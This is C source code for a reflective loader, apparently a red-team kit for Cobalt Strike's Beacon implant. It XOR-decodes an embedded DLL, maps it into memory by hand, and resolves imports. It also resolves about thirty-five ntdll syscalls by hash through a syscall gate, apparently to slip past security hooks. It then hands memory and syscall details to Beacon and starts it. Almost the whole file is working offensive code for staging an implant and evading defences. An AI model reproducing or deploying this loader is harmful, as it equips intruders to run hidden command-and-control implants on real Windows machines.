/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "beacon.h"
#include "gate.h"
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$VirtualAlloc   (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualFree    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
DECLSPEC_IMPORT int    WINAPIV MSVCRT$strncmp          (const char * string1, const char * string2, size_t count);

#define NTDLL_HASH 0x3CFA685D

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);

#define GETRESOURCE(x) (char *)&x

char _DLL_[0] __attribute__((section("dll")));
char _KEY_[0] __attribute__((section("key")));

typedef struct {
    int  length;
    char value[];
} RESOURCE;

typedef struct _PEB_LDR_DATA {
   DWORD dwLength;
   DWORD dwInitialized;
   LPVOID lpSsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct __PEB {
   BYTE bInheritedAddressSpace;
   BYTE bReadImageFileExecOptions;
   BYTE bBeingDebugged;
   BYTE bSpareBool;
   LPVOID lpMutant;
   LPVOID lpImageBaseAddress;
   PPEB_LDR_DATA pLdr;
   LPVOID lpProcessParameters;
   LPVOID lpSubSystemData;
   LPVOID lpProcessHeap;
} _PEB, * _PPEB;

char * resolve(DWORD modHash, DWORD funcHash) {
    char * hModule = (char *)findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}

void ResolveSyscallEntry(PVOID ntdll, PVOID func, SYSCALL_API_ENTRY * entry)
{
	SYSCALL_GATE gate;
	memset(&gate, 0, sizeof(SYSCALL_GATE));
	
	if (GetSyscall(ntdll, func, &gate))
	{
		entry->fnAddr  = func;
		entry->sysnum  = gate.ssn;
		entry->jmpAddr = gate.jmpAddr;
	}
}

void ResolveSyscalls(SYSCALL_API * syscalls)
{
    char * ntdll = findModuleByHash(NTDLL_HASH);

    /* get all the supported Nt functions */
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xD33BCABD), &syscalls->ntAllocateVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x8C394D89), &syscalls->ntProtectVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xDB63B5AB), &syscalls->ntFreeVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xE935E393), &syscalls->ntGetContextThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x6935E395), &syscalls->ntSetContextThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xC54A46C8), &syscalls->ntResumeThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x4D1DEB74), &syscalls->ntCreateThreadEx);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xF0CA9CA0), &syscalls->ntOpenProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x59651E8C), &syscalls->ntOpenThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xDCD44C5F), &syscalls->ntClose);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x5BB29BCB), &syscalls->ntCreateSection);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xD5159B94), &syscalls->ntMapViewOfSection);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xF21037D0), &syscalls->ntUnmapViewOfSection);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x4F138492), &syscalls->ntQueryVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xB55C7785), &syscalls->ntDuplicateObject);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x3AEFA5AA), &syscalls->ntReadVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xC5108CC2), &syscalls->ntWriteVirtualMemory);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x84FCD516), &syscalls->ntReadFile);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x680E1933), &syscalls->ntWriteFile);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x3888F9D),  &syscalls->ntCreateFile);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x52E9A746), &syscalls->ntQueueApcThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xB9C75AD6), &syscalls->ntCreateProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x5992A97F), &syscalls->ntOpenProcessToken);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xB163D6A2), &syscalls->ntTestAlert);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x234A15E3), &syscalls->ntSuspendProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x32ADFBCA), &syscalls->ntResumeProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xE4E1CAD6), &syscalls->ntQuerySystemInformation);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x6EF04C50), &syscalls->ntQueryDirectoryFile);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x814EF02C), &syscalls->ntSetInformationProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xE3D6909C), &syscalls->ntSetInformationThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xB10FD839), &syscalls->ntQueryInformationProcess);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xD83695),   &syscalls->ntQueryInformationThread);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x92B5DD95), &syscalls->ntOpenSection);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0xECDFDBE5), &syscalls->ntAdjustPrivilegesToken);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x8408DD38), &syscalls->ntDeviceIoControlFile);
    ResolveSyscallEntry(ntdll, findFunctionByHash(ntdll, 0x2DAAD6F4), &syscalls->ntWaitForMultipleObjects);
}

void ResolveRtlFunctions(RTL_API * rtls)
{
    char * ntdll = findModuleByHash(NTDLL_HASH);

    rtls->rtlDosPathNameToNtPathNameUWithStatusAddr = findFunctionByHash(ntdll, 0x78D569C0);
    rtls->rtlFreeHeapAddr                           = findFunctionByHash(ntdll, 0xDA12B8);

    /* rtlGetProcessHeapAddr is set to the ProcessHeap address from the PEB */
    _PEB * pPEB = (_PEB *)__readgsqword(0x60);
    rtls->rtlGetProcessHeapAddr = (void *)pPEB->lpProcessHeap;
}

ALLOCATED_MEMORY_LABEL GetLabelFromSectionHeader(IMAGE_SECTION_HEADER * sectionHdr)
{    
    if (MSVCRT$strncmp((char *)sectionHdr->Name, ".text", IMAGE_SIZEOF_SHORT_NAME) == 0) {
        return LABEL_TEXT;
    }
    else if (MSVCRT$strncmp((char *)sectionHdr->Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
        return LABEL_RDATA;
    }
    else if (MSVCRT$strncmp((char *)sectionHdr->Name, ".data", IMAGE_SIZEOF_SHORT_NAME) == 0) {
        return LABEL_DATA;
    }
    else if (MSVCRT$strncmp((char *)sectionHdr->Name, ".pdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
        return LABEL_PDATA;
    }
    else if (MSVCRT$strncmp((char *)sectionHdr->Name, ".reloc", IMAGE_SIZEOF_SHORT_NAME) == 0) {
        return LABEL_RELOC;
    }
    else {
        return LABEL_EMPTY;
    }
}

void FixSectionPermissions(DLLDATA * dll, char * dst, ALLOCATED_MEMORY_REGION * region)
{
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    void                  * sectionDst       = NULL;
    DWORD                   sectionSize      = 0;
    DWORD                    newProtection     = 0;
    DWORD                    oldProtection     = 0;

    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < numberOfSections; i++)
    {
        sectionDst  = dst + sectionHdr->VirtualAddress;
        sectionSize = sectionHdr->SizeOfRawData;

        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtection = PAGE_WRITECOPY;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
            newProtection = PAGE_READONLY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
            newProtection = PAGE_READWRITE;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtection = PAGE_EXECUTE;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtection = PAGE_EXECUTE_WRITECOPY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtection = PAGE_EXECUTE_READ;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            newProtection = PAGE_EXECUTE_READWRITE;
        }

        KERNEL32$VirtualProtect(sectionDst, sectionSize, newProtection, &oldProtection);
        
        region->Sections[i].Label           = GetLabelFromSectionHeader(sectionHdr);
        region->Sections[i].BaseAddress     = sectionDst;
        region->Sections[i].VirtualSize     = sectionSize;
        region->Sections[i].CurrentProtect  = newProtection;
        region->Sections[i].PreviousProtect = newProtection;
        region->Sections[i].MaskSection     = TRUE;

        sectionHdr++;
    }
}

void go()
{
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* get the masked dll and key */
    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);

    /* unmask and load into memory */
    char * src = (char *)KERNEL32$VirtualAlloc(NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0; i < dll->length; i++) {
        src[i] = dll->value[i] ^ key->value[i % key->length];
    }
    
    /* parse beacon headers */
    DLLDATA data;
    ParseDLL(src, &data);

    /* load it into new memory */
    char * dst = (char *)KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    LoadDLL(&data, src, dst);
    ProcessImports(&funcs, &data, dst);

    /* initialise bud */
    USER_DATA        bud;
    SYSCALL_API      syscalls;
    RTL_API          rtlFunctions;
    ALLOCATED_MEMORY memory;

    memset(&bud,          0, sizeof(USER_DATA));
    memset(&syscalls,     0, sizeof(SYSCALL_API));
    memset(&rtlFunctions, 0, sizeof(RTL_API));
    memset(&memory,       0, sizeof(ALLOCATED_MEMORY));

    bud.version         = COBALT_STRIKE_VERSION;
    bud.syscalls        = &syscalls;
    bud.rtls            = &rtlFunctions;
    bud.allocatedMemory = &memory;

    /* fix section memory permissions */
    FixSectionPermissions(&data, dst, &bud.allocatedMemory->AllocatedMemoryRegions[0]);

    /* define cleanup information for VirtualAlloc */
    ALLOCATED_MEMORY_CLEANUP_INFORMATION vaCleanup;
    memset(&vaCleanup, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));

    vaCleanup.AllocationMethod = METHOD_VIRTUALALLOC;
    vaCleanup.Cleanup          = TRUE;

    /* set the region info for beacon */
    bud.allocatedMemory->AllocatedMemoryRegions[0].Purpose            = PURPOSE_BEACON_MEMORY;
    bud.allocatedMemory->AllocatedMemoryRegions[0].AllocationBase     = dst;
    bud.allocatedMemory->AllocatedMemoryRegions[0].RegionSize         = data.NtHeaders->OptionalHeader.SizeOfImage;
    bud.allocatedMemory->AllocatedMemoryRegions[0].Type               = MEM_PRIVATE;
    bud.allocatedMemory->AllocatedMemoryRegions[0].CleanupInformation = vaCleanup;

    /* resolve syscall info */
    ResolveSyscalls(&syscalls);
    ResolveRtlFunctions(&rtlFunctions);

    /* get the entry point */
    DLLMAIN_FUNC entryPoint = EntryPoint(&data, dst);

    /* free the unmasked copy */
    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);

    /* call entry point */
    entryPoint((HINSTANCE)0, DLL_BEACON_USER_DATA, &bud);
    entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
    entryPoint((HINSTANCE)GETRESOURCE(go), DLL_BEACON_START, NULL);
}